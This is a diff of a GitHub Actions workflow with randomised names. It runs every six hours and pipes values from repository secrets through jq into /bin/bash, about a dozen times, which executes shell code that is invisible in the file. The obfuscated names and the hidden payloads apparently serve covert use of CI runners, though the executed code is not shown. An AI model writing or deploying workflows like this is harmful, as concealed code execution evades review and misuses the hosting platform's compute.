@@ -1,22 +1,28 @@
 name: longfeishu2123
+
 on:
   workflow_dispatch:
   schedule:
-    - cron: '19 4/6 * * *'
+    - cron: '40 2/6 * * *'
 jobs:
   build:
     runs-on: ubuntu-latest
+
     steps:
       - uses: actions/checkout@v4
       - name: longfeishu2123
         env:
-          mnsqf29: ${{ secrets.mnsqf29 }}
+          a2: ${{ secrets.a2 }}
         run: |
-          echo $mnsqf29 | jq -r .kggqw7372 | /bin/bash
-          echo $qzicb9650 | jq -r .xdtvy4 | /bin/bash
-          echo $spzr7 | jq -r .ypo74061 | /bin/bash
-          echo $g308 | jq -r .vc4599 | /bin/bash
-          echo $oewhz607 | jq -r .ivqq9371 | /bin/bash
-          echo $e56 | jq -r .beztc64 | /bin/bash
-          echo $jpyk1 | jq -r .i04 | /bin/bash
+          echo $a2 | jq -r .b11 | /bin/bash
+          echo $ecleo8 | jq -r .bvpr508 | /bin/bash
+          echo $tshm12 | jq -r .awsud950 | /bin/bash
+          echo $zd2 | jq -r .vu743 | /bin/bash
+          echo $xaz099 | jq -r .bob0947 | /bin/bash
+          echo $ou90525 | jq -r .zsivn49 | /bin/bash
+          echo $rdtmb093 | jq -r .alj88 | /bin/bash
+          echo $gurox571 | jq -r .l4988 | /bin/bash
+          echo $h1 | jq -r .lkps112 | /bin/bash
+          echo $m6 | jq -r .st7334 | /bin/bash
+          echo $qlu84334 | jq -r .fgn66 | /bin/bash
 
